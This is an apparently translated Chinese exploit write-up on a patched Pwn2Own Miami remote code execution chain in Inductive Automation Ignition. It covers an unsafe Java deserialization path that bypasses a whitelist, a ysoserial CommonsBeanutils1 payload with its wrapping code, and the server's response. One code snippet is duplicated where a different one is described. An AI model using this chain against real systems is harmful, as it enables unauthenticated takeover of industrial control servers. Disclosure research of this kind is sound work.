        ObjectInputStream ois = null; 
        Object obj = null; 
        try { 
            bais = new ByteArrayInputStream(objBytes); 
            if (classWhitelist != null) { 
                ois = new SaferObjectInputStream(bais, classWhitelist); 
            } else { 
                ois = new ObjectInputStream(bais); 
            } 
            obj = ((ObjectInputStream)ois).readObject(); 
        } finally { 
            try { 
                bais.close(); 
            } catch (Exception var15) { 
            } 
            try { 
                ((ObjectInputStream)ois).close(); 
            } catch (Exception var14) { 
            } 
        } 
        return obj; 
    }
如上所示，如果`decodeToObjectFragile()`接收到null，而不是允许的类列表，则它将使用“normal”`ObjectInputStream`对对象进行反序列化，从而带来一些问题和风险点。但是，如果指定了允许列表，则`decodeToObjectFragile`将使用`SaferObjectInputStream`类来反序列化对象。
`SaferObjectInputStream`类是`ObjectInputStream`的包装，用于检查需要反序列化的每个对象的类。如果该类不是允许列表的一部分，则会拒绝所有输入，并在产生任何有害影响之前终止处理。相关代码如下：
    public class SaferObjectInputStream extends ObjectInputStream { 
        public static final Set> DEFAULT_WHITELIST = ImmutableSet.of(String.class, Byte.class, Short.class, Integer.class, Long.class, Number.class, new Class[]{Float.class, Double.class, Boolean.class, Date.class, Color.class, ArrayList.class, HashMap.class, Enum.class}); 
        private final Set whitelist; 
        public SaferObjectInputStream(InputStream in) throws IOException { 
            this(in, DEFAULT_WHITELIST); 
        } 
        public SaferObjectInputStream(InputStream in, Set> whitelist) throws IOException { 
            super(in); 
            this.whitelist = new HashSet(); 
            Iterator var3 = whitelist.iterator(); 
            while(var3.hasNext()) { 
                Class c = (Class)var3.next(); 
                this.whitelist.add(c.getName()); 
            } 
        } 
        protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException { 
            ObjectStreamClass ret = super.readClassDescriptor(); 
            if (!this.whitelist.contains(ret.getName())) { 
                throw new ClassNotFoundException(String.format("Unexpected class %s encountered on input stream.", ret.getName())); 
            } else { 
                return ret; 
            } 
        } 
    }
从上面的代码片段中可以看出，默认的允许列表（`DEFAULT_WHITELIST`）非常严格。它仅允许反序列化以下对象类型：
          -- String
          -- Byte
          -- Short
          -- Integer
          -- Long
          -- Number
          -- Float
          -- Double
          -- Boolean
          -- Date
          -- Color
          -- ArrayList
          -- HashMap
          -- Enum
由于上述这些都是非常简单的类型，因此我们在这里描述的机制是防范大多数Java反序列化攻击的有效方法。
在本文中，由于篇幅限制，我们难以详细解释Java反序列化发生的方式及可能导致的破坏性影响。如果大家有兴趣阅读关于该漏洞的更多信息，建议阅读Java
Unmarshaller Security或Foxglove Security的博客文章。接下来，我们来看看在Pwn2Own中使用的漏洞利用链。
## 三、未授权访问敏感资源漏洞
漏洞利用链中的第一个漏洞是信息泄露，但并没有在我们的漏洞利用过程中用到。未经身份验证的攻击者可以调用“project
diff”功能来获取有关项目的关键信息。在我们的案例中，我们以此为跳板来攻击其他功能。
在`com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload`类中，包含许多未经身份验证的远程攻击者可以访问的操作，其中的一个函数就是`getDiffs()`，如下所示：
    @GatewayFunction 
    public String getDiffs(GatewayContext context, HttpSession session, String sessionProject, String projectSnapshotsBase64) throws GatewayFunctionException { 
        try { 
            List snapshots = (List)Base64.decodeToObjectFragile(projectSnapshotsBase64); 
            RuntimeProject p = ((RuntimeProject)context.getProjectManager().getProject(sessionProject).orElseThrow(() -> new ProjectNotFoundException(sessionProject))).validateOrThrow(); 
            List diffs = context.getProjectManager().pull(snapshots); 
            return (diffs == null) ? null : Base64.encodeObject(Lists.newArrayList(diffs)); 
        } catch (Exception e) { 
            throw new GatewayFunctionException(500, "Unable to load project diff.", e); 
        }  
    }
如上所示的函数会将提供的数据与服务器中的项目数据进行比较，并返回二者的差异。如果攻击者提供了有效的项目名称，那么服务器可能会提供（泄露）所有项目数据。
同样，这个功能并没有在我们的漏洞利用中使用。而相反，该功能用于进一步攻击系统的跳板，下面将对此展开进一步的说明。
## 四、不安全的Java反序列化漏洞
从上面的代码片段中可以看出，`ProjectDownload.getDiffs()`使用`Base64.decodeToObjectFragile()`函数对项目数据进行解码。之前的代码中已经解释了该函数。如上所示，如果该函数的第二个参数中未提供允许的类的列表，则它将使用标准的不安全`ObjectInputStream`类来对指定的对象进行解码。这样一来，将会产生一个经典的Java反序列化漏洞，当其与最后一个漏洞共同使用时，最终会导致远程执行代码。
## 五、使用不安全Java库问题
漏洞利用链中的最后一个漏洞，是将Java类与易受攻击的Java
Gadget对象一起滥用，这些对象可以用于实现远程代码执行。对于我们来说比较幸运的是，Ignition就是如此。它使用了Apache Commons
Beanutils的一个非常老的版本1.9.2，该版本发布于2013年。
在知名的ysererial Java反序列化漏洞利用工具CommonsBeanutils1中，有一个针对该库的Payload。
## 六、漏洞组合利用
总而言之，要实现远程代码执行，我们需要执行以下操作：
1、创建一个ysoserial CommonsBeanutils1 Payload；  
2、将Payload进行Base64编码；  
3、将Payload封装在Java `String`对象中；  
4、使用标准的Java序列化功能对`String`对象进行序列化；  
5、对序列化后的`String`对象进行Base64编码；  
6、使用恶意参数将请求发送到/system/gateway，调用`getDiffs()`。
这样一来，我们就能绕过序列化的白名单，并执行我们的代码！但是，具体要如何实现呢？我们还需要深入研究一下。
我们的Payload将具有以下格式：
    base64(String(base64(YSOSERIAL_PAYLOAD))
上面代码片段中展示过的代码将对其进行Base64解码，这将导致：
    String(base64(YSOSERIAL_PAYLOAD))
由于它是`String`类，因此根据上一章中的白名单进行了检查，检查结果将允许对其进行反序列化。然后，就进入到了`ProjectDownload.getDiffs()`，它使用我们的`String`参数，在不指定白名单的情况下对其调用`Base64.decodeToObjectFragile()`。
如之前展示的代码所示，这将导致`String`被Base64解码，然后在我们的恶意对象（`YSOSERIAL_PAYLOAD`）
上调用`ObjectInputStream.readObject()`，从而导致代码执行！
## 七、编写Payload
要编写我们的Payload，首先需要调用`ysoserial`，如下所示：
    public static void main(String[] args) { 
        try { 
            String payload = ""; 
            ByteArrayOutputStream bos = new ByteArrayOutputStream(); 
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(bos); 
            objectOutputStream.writeObject(payload); 
            objectOutputStream.close(); 
            byte[] encodedBytes = Base64.getEncoder().encode(bos.toByteArray()); 
            FileOutputStream fos = new FileOutputStream("/tmp/output"); 
            fos.write(encodedBytes); 
            fos.close(); 
            bos.close(); 
        } catch (Exception e) { 
            e.printStackTrace(); 
        } 
    }
然后，可以使用以下Java代码将Payload封装在String里面，并将其序列化到磁盘中：
    public static void main(String[] args) { 
        try { 
            String payload = ""; 
            ByteArrayOutputStream bos = new ByteArrayOutputStream(); 
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(bos); 
            objectOutputStream.writeObject(payload); 
            objectOutputStream.close(); 
            byte[] encodedBytes = Base64.getEncoder().encode(bos.toByteArray()); 
            FileOutputStream fos = new FileOutputStream("/tmp/output"); 
            fos.write(encodedBytes); 
            fos.close(); 
            bos.close(); 
        } catch (Exception e) { 
            e.printStackTrace(); 
        } 
    }
在这段代码中，``应该包含上述代码的输出。
最后，我们将以下请求发送到目标：
        1184437744
        2
            199
                    ]]>
            en
            GB
``中将包含正在运行的代码段的输出，目标响应如下：
            500
            Unable to load project diff.
                Unable to load project diff.
                com.inductiveautomation.ignition.gateway.servlets.gateway.functions.GatewayFunctionException: Unable to load project diff.
                com.inductiveautomation.ignition.gateway.servlets.gateway.functions.GatewayFunctionException
                false
                    com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload
                    getDiff
                    ProjectDownload.java
                    52
                    jdk.internal.reflect.NativeMethodAccessorImpl
                    invoke0
                    null
                    -2
                    jdk.internal.reflect.NativeMethodAccessorImpl
                    invoke
                    null
                    -1
                    jdk.internal.reflect.DelegatingMethodAccessorImpl
                    invoke
                    null
                    -1
在响应中，包含一个栈跟踪，表明其中存在一些问题，但Payload是以SYSTEM权限（在Linux中是以root）来执行的。
使用上面提供的Payload，文件将位于`C:flashback.txt`中，其中的文本为`nt
authoritysystem`。这表明我们已经成功实现了未经身份验证的远程代码执行。
## 八、总结
在本文中，我们对在Pwn2Own Miami中发现的漏洞利用展开了详细分析，Inductive
Automation已经在8.0.10版本中修复了这些漏洞。在新版本中，还包含许多其他修复程序和新功能，如果大家想要自行测试，为方便起见，我们发布了Metasploit模块。在本文开头的视频中，可以看到该模块的运行情况。
再次感谢Pedro和Radek提供的出色文章，并感谢他们对Pwn2Own
Miami的贡献。我们期待后续能收到更多来自他们的投稿，在此之前，欢迎关注该团队以获取组新的漏洞利用技术和安全补丁。